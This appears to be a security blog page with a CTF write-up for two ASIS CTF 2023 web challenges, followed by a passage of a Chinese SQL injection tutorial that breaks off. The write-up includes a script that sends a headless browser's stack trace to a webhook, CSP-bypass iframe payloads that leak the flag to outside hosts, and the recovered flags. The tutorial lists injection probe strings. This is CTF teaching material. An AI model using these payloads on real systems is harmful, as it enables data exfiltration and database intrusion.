    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ch.jpg">
      <meta itemprop="name" content="chleynx">
      <meta itemprop="description" content="Record my study life">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="chleynx's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/25/ASISCTF/" class="post-title-link" itemprop="url">ASISCTF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-12-25 00:22:51" itemprop="dateCreated datePublished" datetime="2023-12-25T00:22:51+08:00">2023-12-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-02-05 00:25:27" itemprop="dateModified" datetime="2024-02-05T00:25:27+08:00">2024-02-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Pupptear"><a href="#Pupptear" class="headerlink" title="Pupptear:"></a><strong>Pupptear:</strong></h2><p>***æŠ¥é”™è¿½è¸ªæ–‡ä»¶åå­—</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Do you know what Puppeteer&#x27;s friends call him when he cries? Pupptear... hahahaah</span><br><span class="line"></span><br><span class="line">[attachment](&lt;https://asisctf.com/tasks/pupptear_0ab53ea3b73da58a4d0854bf42ec1ea166283b3e.txz&gt;)</span><br><span class="line"></span><br><span class="line">nc 18.195.96.13 2000</span><br><span class="line"></span><br><span class="line">Flag format for Pupptear: ^ASIS&#123;[^&#123;&#125;]+&#125;$</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/7865afae-5d80-486d-b9d3-9239e8b4ff5e/pupptear.txz">pupptear.txz</a></p>
<p>oh ok</p>
<p>I get the concept.</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="title function_">input</span>(<span class="string">&#x27;input URL (b64ed): &#x27;</span>)</span><br><span class="line"><span class="keyword">if</span>(not re.<span class="title function_">match</span>(<span class="string">&#x27;^[A-Za-z0-9=+/]+$&#x27;</span>,url)):</span><br><span class="line">	<span class="title function_">print</span>(<span class="string">&#x27;bad URL&#x27;</span>)</span><br><span class="line">	<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">os.<span class="title function_">close</span>(<span class="number">0</span>)</span><br><span class="line">os.<span class="title function_">close</span>(<span class="number">1</span>)</span><br><span class="line">os.<span class="title function_">close</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">containerName = <span class="string">&#x27;&#x27;</span>.<span class="title function_">join</span>(random.<span class="title function_">choice</span>(string.<span class="property">ascii_uppercase</span> + string.<span class="property">digits</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0x10</span>))</span><br><span class="line">os.<span class="title function_">system</span>(f<span class="string">&#x27;bash -c &quot;sleep 5 &amp;&amp; docker kill &#123;containerName&#125; 2&gt;/dev/null&quot; &amp;&#x27;</span>)</span><br><span class="line">os.<span class="title function_">system</span>(f<span class="string">&#x27;docker run --name &#123;containerName&#125; pupptear bash -c \\&#x27;</span>/<span class="variable constant_">ASIS</span>*/index.<span class="property">js</span> &#123;url&#125;\\<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">#!<span class="regexp">/usr/</span>bin/env node</span><br><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">&#x27;flag&#123;test-flag&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visit</span>(<span class="params">url</span>)&#123;</span><br><span class="line">	<span class="keyword">let</span> browser;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="regexp">/^https?:\\/</span>\\<span class="comment">//.test(url))&#123;</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">		    <span class="attr">pipe</span>: <span class="literal">true</span>,</span><br><span class="line">		    <span class="attr">args</span>: [</span><br><span class="line">		        <span class="string">&quot;--no-sandbox&quot;</span>,</span><br><span class="line">		        <span class="string">&quot;--disable-setuid-sandbox&quot;</span>,</span><br><span class="line">		        <span class="string">&quot;--js-flags=--noexpose_wasm,--jitless&quot;</span>,</span><br><span class="line">		        <span class="string">&quot;--ignore-certificate-errors&quot;</span>,</span><br><span class="line">		    ],</span><br><span class="line">		    <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/google-chrome-stable&quot;</span>,</span><br><span class="line">		    <span class="attr">headless</span>: <span class="string">&#x27;new&#x27;</span></span><br><span class="line">		&#125;);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">let</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">		<span class="keyword">await</span> page.<span class="title function_">goto</span>(url,&#123; <span class="attr">timeout</span>: <span class="number">2000</span> &#125;);</span><br><span class="line">		<span class="keyword">await</span> page.<span class="title function_">waitForFunction</span>(<span class="function"><span class="params">flag</span>=&gt;</span>&#123;</span><br><span class="line">			<span class="keyword">let</span> el = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">			<span class="keyword">if</span>(!el) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			el.<span class="property">value</span> = flag</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;,&#123; <span class="attr">timeout</span>: <span class="number">2000</span> &#125;,flag)</span><br><span class="line">		<span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">r</span>=&gt;</span><span class="built_in">setTimeout</span>(r,<span class="number">3000</span>));</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">	<span class="keyword">try</span>&#123;<span class="keyword">await</span> browser.<span class="title function_">close</span>();&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">	process.<span class="title function_">exit</span>(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>get folder name? have no idea.</p>
<p>need to check if we can get flag during page move delay<img src="/2023/12/25/ASISCTF/image-20240101163004369-1707063823030-1.png" alt="image-20240101163004369"></p>
<p>fake flag. need to get folder name. i guess stacktrace from waitforfunction?</p>
<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./stuff/ /app/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> PUPPETEER_SKIP_DOWNLOAD=1 npm ci</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /app/index.js</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m www</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 777 /home/www/ -R</span></span><br><span class="line"><span class="keyword">ENV</span> FLAG=ASIS&#123;test-flag&#125;</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mv</span> /app/ /<span class="variable">$FLAG</span>/</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /</span></span><br><span class="line"><span class="keyword">USER</span> www</span><br></pre></td></tr></table></figure>

<p>I guess yes.</p>
<p>One way is to hook <code>Error</code> and find filename, but I have to install puppeteer for testing. I donâ€™t know how things work internally for puppeteerğŸ˜•</p>
<p>If no one solves it I will try out sometime tomorrow.</p>
<p>i dont know either. ppt is heavily coupled with chrome devtools, i guess the function execution is a part of devtools protocol.</p>
<p>hook getElementById, read stacktrace.</p>
<p>solved:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> oldFunc = <span class="variable language_">document</span>.<span class="property">getElementById</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">getElementById</span> = <span class="keyword">function</span>(<span class="params">id</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> e = <span class="keyword">new</span> <span class="title class_">Error</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> stack = e.<span class="property">stack</span>.<span class="title function_">split</span>(<span class="string">&#x27;\\n&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fetch</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">document</span>.location.href&#125;</span>`</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">          id,</span></span><br><span class="line"><span class="language-javascript">          stack</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> oldFunc.<span class="title function_">apply</span>(<span class="variable language_">document</span>, <span class="variable language_">arguments</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">const HOOK_URL = &quot;https://webhook.site/ae22bc03-bb75-4080-9702-36cbb57cc53d&quot;;</span><br><span class="line"></span><br><span class="line">let sent = false;</span><br><span class="line">function hook() &#123;</span><br><span class="line">  if (sent) return;</span><br><span class="line">  sent = true;</span><br><span class="line"></span><br><span class="line">  const e = new Error();</span><br><span class="line">  navigator.sendBeacon(HOOK_URL, e.stack);</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById = hook;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/25/ASISCTF/image-20240101162824320-1707063823030-2.png" alt="image-20240101162824320"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Error</span><br><span class="line">    at HTMLDocument.hook [as getElementById] (http://47.108.69.229/?id&#123;aaa111&#125;:11:13)</span><br><span class="line">    at eval (eval at G (:3:1641), &lt;anonymous&gt;:4:22)</span><br><span class="line">    at P.&lt;anonymous&gt; (pptr:evaluateHandle;WaitTask.rerun (/ASIS&#123;d1d-y0u-m4k3-pupp733r-cry-4n-3rr0r-6u35f5&#125;/node_modules/puppeteer-core/lib/cjs/puppeteer/common/WaitTask.js:80:54):4:36)</span><br><span class="line">    at P.start (pptr:internal:3:3734)</span><br><span class="line">    at pptr:evaluate;WaitTask.rerun (/ASIS&#123;d1d-y0u-m4k3-pupp733r-cry-4n-3rr0r-6u35f5&#125;/node_modules/puppeteer-core/lib/cjs/puppeteer/common/WaitTask.js:110:32):2:29</span><br></pre></td></tr></table></figure>

<p>ASIS{d1d-y0u-m4k3-pupp733r-cry-4n-3rr0r-6u35f5}</p>
<h2 id="gimme-csp-warmup"><a href="#gimme-csp-warmup" class="headerlink" title="gimme csp(warmup):"></a><strong>gimme csp(warmup):</strong></h2><p>ç»•è¿‡cspâ€”â€”-iframeæ ‡ç­¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hint for beginners: read about CSPs and Iframes and what features they can offer that you can use to bypass or exfiltrate things. The challenge isn&#x27;t easy if you are new to CTFs or don&#x27;t have much experience however it should be the easiest web challenge.</span><br><span class="line"></span><br><span class="line">[attachment](&lt;https://asisctf.com/tasks/gimme-csp_2b4abfa898695e4a37f7f36e4ba1b35a88f37103.txz&gt;)</span><br><span class="line"></span><br><span class="line">website: &lt;https://gimmecsp.asisctf.com&gt;</span><br><span class="line">Admin bot: &lt;http://18.195.96.13:8001&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/afec582d-a963-4f8b-9bbb-a140d32e55dc/gimme-csp.txz">gimme-csp.txz</a></p>
<p>ok</p>
<p>I can solve</p>
<p>server returned multiple csp header and only the default-src â€˜noneâ€™ works</p>
<p>one last stepâ€¦</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;&lt;https://gimmecsp.asisctf.com/?letter=$gift$&gt;&lt;/pre&gt;1234&lt;link rel=&#x27;stylesheet&#x27; href=&#x27;//fe.gy/1.css&#x27;&gt;&lt;/script&gt;&quot;</span> csp=<span class="string">&quot;stylescript-src-src-elem &#x27;self&#x27; &#x27;unsafe-eval&#x27; &lt;https://fe.gy&gt; &#x27;unsafe-inline&#x27;;&quot;</span>  referrerpolicy=<span class="string">&quot;no-referrer&quot;</span>&gt;&lt;<span class="regexp">/iframe&gt;&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure>

<p>oh</p>
<p>got an idea ğŸ™‚</p>
<p>I think the <code>csp</code> attribute does some sort of sandboxing, we need to find some good way to prefetch or load the flag</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;&lt;https://gimmecsp.asisctf.com/?letter=&gt;&lt;/pre&gt;1234&lt;img src=&#x27;&lt;https://fe.gy/$gift$&gt;&#x27;&gt;&lt;/script&gt;&quot;</span> csp=<span class="string">&quot;img-src &lt;https://fe.gy&gt;; defascript-srcult-sscript-srcrc &lt;https://fe.gy&gt;; repscript-srcort-uscript-srcri &lt;https://fe.gy&gt;;&quot;</span> referrerpolicy=<span class="string">&quot;no-referrer&quot;</span>&gt;&lt;<span class="regexp">/iframe&gt;&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure>

<p>ok</p>
<p>I think I can get flag now?</p>
<p>Hereâ€™s a way</p>
<p>solved now</p>
<p>exploit:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;&lt;https://gimmecsp.asisctf.com/?letter=&gt;&lt;/pre&gt;1234&lt;img src=&#x27;&lt;http://$gift$.harold.kim:1337/&gt;&#x27;&gt;&lt;/script&gt;&quot;</span> csp=<span class="string">&quot;img-src https://*; defascript-srcult-sscript-srcrc &lt;http://harold.kim:1337/&gt;; repscript-srcort-uscript-srcri &lt;https://azusawa.world/a.php;&quot;</span>&gt; referrerpolicy=<span class="string">&quot;no-referrer&quot;</span>&gt;&lt;<span class="regexp">/iframe&gt;&lt;/</span>body&gt;</span><br><span class="line">&#123;<span class="string">&quot;csp-report&quot;</span>:&#123;<span class="string">&quot;document-uri&quot;</span>:<span class="string">&quot;[&lt;https://gimmecsp.asisctf.com/?letter=&gt;&lt;/pre&gt;1234&lt;img src=&#x27;&lt;http://$gift$.harold.kim:1337/&gt;&#x27;&gt;&lt;/script&gt;&quot;</span>,<span class="string">&quot;referrer&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;violated-directive&quot;</span>:<span class="string">&quot;img-src&quot;</span>,<span class="string">&quot;effective-directive&quot;</span>:<span class="string">&quot;img-src&quot;</span>,<span class="string">&quot;original-policy&quot;</span>:<span class="string">&quot;img-src](&lt;https://gimmecsp.asisctf.com/?letter=%3C/pre%3E1234%3Cimg%20src=%27http://$gift$.harold.kim:1337/%27%3E%3C/script%3E%22,%22referrer%22:%22%22,%22violated-directive%22:%22img-src%22,%22effective-directive%22:%22img-src%22,%22original-policy%22:%22img-src&gt;) https://*; default-src &lt;http://harold.kim:1337/&gt;; report-uri [&lt;https://azusawa.world/a.php;&quot;</span>,<span class="string">&quot;disposition&quot;</span>:<span class="string">&quot;enforce&quot;</span>,<span class="string">&quot;blocked-uri&quot;</span>:<span class="string">&quot;https://asis&#123;test-flag&#125;.harold.kim:1337/&quot;</span>,<span class="string">&quot;line-number&quot;</span>:<span class="number">1</span>,<span class="string">&quot;source-file&quot;</span>:<span class="string">&quot;https://gimmecsp.asisctf.com/&quot;</span>,<span class="string">&quot;status-code&quot;</span>:<span class="number">200</span>,<span class="string">&quot;script-sample&quot;</span>:<span class="string">&quot;&gt;](&lt;https://azusawa.world/a.php;%22,%22disposition%22:%22enforce%22,%22blocked-uri%22:%22https://asis%7Btest-flag%7D.harold.kim:1337/%22,%22line-number%22:1,%22source-file%22:%22https://gimmecsp.asisctf.com/%22,%22status-code%22:200,%22script-sample%22:%22&gt;)&quot;</span>&#125;&#125;<span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>

<p>ASIS{1m-n07-r34dy-f0r-2024-y3t-dfadb}</p>

      
    </div>

    
    
    
	
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/10/20/SQL%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ch.jpg">
      <meta itemprop="name" content="chleynx">
      <meta itemprop="description" content="Record my study life">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="chleynx's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/20/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQLæ³¨å…¥</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-10-20 18:38:57" itemprop="dateCreated datePublished" datetime="2023-10-20T18:38:57+08:00">2023-10-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-08-10 01:35:56" itemprop="dateModified" datetime="2024-08-10T01:35:56+08:00">2024-08-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Summary/" itemprop="url" rel="index"><span itemprop="name">Summary</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10594#toc-6">SQLæ³¨å…¥ä¹‹Mysqlæ³¨å…¥å§¿åŠ¿åŠç»•è¿‡æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a>[ç›²æ³¨å»è¿™]</p>
<h2 id="è”åˆæŸ¥è¯¢"><a href="#è”åˆæŸ¥è¯¢" class="headerlink" title="è”åˆæŸ¥è¯¢"></a>è”åˆæŸ¥è¯¢</h2><p>å¾ˆå¤šæ—¶å€™è”åˆæŸ¥è¯¢ä¹Ÿä¼šå’Œå…¶ä»–çš„å‡ ç§æŸ¥è¯¢æ–¹å¼ä¸€èµ·ä½¿ç”¨ã€‚</p>
<h5 id="è”åˆæŸ¥è¯¢ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†"><a href="#è”åˆæŸ¥è¯¢ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†" class="headerlink" title="è”åˆæŸ¥è¯¢ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†"></a>è”åˆæŸ¥è¯¢ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†</h5><p><code>UNION</code>å¯ä»¥å°†å‰åä¸¤ä¸ªæŸ¥è¯¢è¯­å¥çš„ç»“æœæ‹¼æ¥åˆ°ä¸€èµ·ï¼Œä½†æ˜¯ä¼šè‡ªåŠ¨å»é‡ã€‚</p>
<p><code>UNION ALL</code>åŠŸèƒ½ç›¸åŒï¼Œä½†æ˜¯ä¼šæ˜¾ç¤ºæ‰€æœ‰æ•°æ®ï¼Œä¸ä¼šå»é‡ã€‚</p>
<p>å…·æœ‰ç±»ä¼¼åŠŸèƒ½çš„è¿˜æœ‰<code>JOIN</code> <a target="_blank" rel="noopener" href="https://blog.csdn.net/julielele/article/details/82023577">https://blog.csdn.net/julielele/article/details/82023577</a> ä½†æ˜¯æ˜¯ä¸€ä¸ªå¯¹åº“è¡¨ç­‰è¿›è¡Œè¿æ¥çš„è¯­å¥ï¼Œæˆ‘ä»¬åœ¨åç»­çš„ç»•è¿‡ä¸­ä¼šæåˆ°åˆ©ç”¨å®ƒæ¥è¿›è¡Œæ— åˆ—åæ³¨å…¥ã€‚</p>
<h5 id="æ³¨å…¥æµç¨‹"><a href="#æ³¨å…¥æµç¨‹" class="headerlink" title="æ³¨å…¥æµç¨‹"></a>æ³¨å…¥æµç¨‹</h5><ol>
<li><p>åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹ï¼Œé—­åˆæƒ…å†µï¼Œç»•è¿‡æ–¹å¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; </span><br><span class="line">?id=1&quot; </span><br><span class="line">?id=1&#x27;) </span><br><span class="line">?id=1&quot;) </span><br><span class="line">?id=1&#x27; or 1#</span><br><span class="line">?id=1&#x27; or 0#</span><br><span class="line">?id=1&#x27; or 1=1#</span><br><span class="line">?id=1&#x27; and 1=2#</span><br><span class="line">?id=1&#x27; and sleep(5)#</span><br><span class="line">?id=1&#x27; and 1=2 or &#x27; </span><br><span class="line">?id=1\</span><br></pre></td></tr></table></figure>
</li>
<li><p>çŒœæµ‹SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°</p>
<ul>
<li>ä½¿ç”¨ order&#x2F;group by è¯­å¥ï¼Œé€šè¿‡å¾€åè¾¹æ‹¼æ¥æ•°å­—æŒ‡å¯¼é¡µé¢æŠ¥é”™ï¼Œå¯ç¡®å®šå­—æ®µæ•°é‡ã€‚</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br><span class="line">1&#x27; order by 2#</span><br><span class="line">1&#x27; order by 3#</span><br><span class="line">1 order by 1</span><br><span class="line">1 order by 2</span><br><span class="line">1 order by 3</span><br></pre></td></tr></table></figure>

<ul>
<li>ä½¿ç”¨ union select è”åˆæŸ¥è¯¢ï¼Œä¸æ–­åœ¨ union select åé¢åŠ æ•°å­—ï¼Œç›´åˆ°ä¸æŠ¥é”™ï¼Œå³å¯ç¡®å®šå­—æ®µæ•°é‡ã€‚</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1#</span><br><span class="line">1&#x27; union select 1,2#</span><br><span class="line">1&#x27; union select 1,2,3#</span><br><span class="line">1 union select 1#</span><br><span class="line">1 union select 1,2#</span><br><span class="line">1 union select 1,2,3#</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç¡®å®šæ˜¾ç¤ºæ•°æ®çš„å­—æ®µä½ç½®<br>ä½¿ç”¨ union select 1,2,3,4,â€¦ æ ¹æ®å›æ˜¾çš„å­—æ®µæ•°ï¼Œåˆ¤æ–­å›æ˜¾æ•°æ®çš„å­—æ®µä½ç½®ã€‚</p>
